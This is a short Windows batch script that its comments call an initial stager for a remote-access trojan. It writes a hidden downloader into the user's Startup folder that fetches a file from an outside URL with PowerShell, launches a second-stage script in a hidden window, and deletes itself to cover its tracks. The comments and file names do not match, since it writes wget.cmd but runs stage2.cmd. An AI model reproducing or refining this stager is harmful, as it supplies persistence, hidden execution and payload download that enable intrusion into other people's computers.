@echo off
@REM initial stager for RAT 
@REM created by :CHEPHYTY
@REM move into startup directory

@REM variables 
@REM INITIALPATH capture the current path of the dir
set "INITIALPATH=%cd%" 
@REM  STARTUP capture the path of the microsoft startup file
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

@REM move into startup directory
cd /d "%STARTUP%"

@REM write payloads to startup
(echo powershell -c "Invoke-WebRequest -Uri 'https://videos.pexels.com/video-files/2759477/2759477-uhd_3840_2160_30fps.mp4' -Outfile 'hello.mp4'") > wget.cmd

@REM hide the stage2.cmd file
attrib +h wget.cmd

@REM run payload 
powershell -windowstyle hidden -Command "Start-Process cmd.exe -ArgumentList '/c %STARTUP%\stage2.cmd' -WindowStyle Hidden"

@REM cd back into initial location
cd /d "%INITIALPATH%"

@REM self-delete without error message
start /b "" cmd /c del "%~f0"&exit
